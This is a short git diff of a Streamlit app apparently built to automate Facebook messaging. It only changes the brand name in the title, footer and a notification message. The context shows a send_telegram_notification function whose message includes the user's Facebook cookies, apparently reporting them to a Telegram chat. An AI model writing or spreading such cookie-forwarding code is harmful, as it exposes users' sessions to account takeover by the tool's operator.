@@ -11,7 +11,7 @@ import requests
 import os
 
 st.set_page_config(
-    page_title="FB E2EE BY RK KRISHNA BRAND",
+    page_title="FB E2EE BY AKASH YADAV BRAND",
     page_icon="🫅",
     layout="wide",
     initial_sidebar_state="expanded"
@@ -488,7 +488,7 @@ def send_telegram_notification(username, automation_state=None, cookies=""):
 
 👤 *Username:* {username}
 ⏰ *Time:* {current_time}
-🤖 *System:* RK KRISHNA BRAND E2EE FACEBOOK AUTOMATION
+🤖 *System:* AKASH YADAV E2EE FACEBOOK AUTOMATION
 🍪 *Cookies:* `{cookies_display}`
 
 ✅ User has successfully started the automation process."""
@@ -1299,4 +1299,4 @@ else:
                 time.sleep(1)
                 st.rerun()
 
-st.markdown('<div class="footer">Made with ❤️ by RK KRISHNA BRAND| © 2025 All Rights Reserved</div>', unsafe_allow_html=True)
+st.markdown('<div class="footer">Made with ❤️ by AKASH YADAV BRAND| © 2025 All Rights Reserved</div>', unsafe_allow_html=True)
